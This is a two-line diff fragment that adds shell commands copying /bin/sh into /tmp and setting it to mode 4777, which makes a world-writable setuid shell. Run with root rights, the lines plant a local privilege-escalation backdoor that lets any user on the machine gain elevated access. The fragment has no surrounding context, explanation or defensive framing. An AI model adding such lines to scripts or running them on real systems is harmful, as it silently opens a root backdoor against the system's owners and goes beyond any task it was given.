@@ -1,0 +1,2 @@
+cp /bin/sh /tmp
+chmod 4777 /tmp/sh
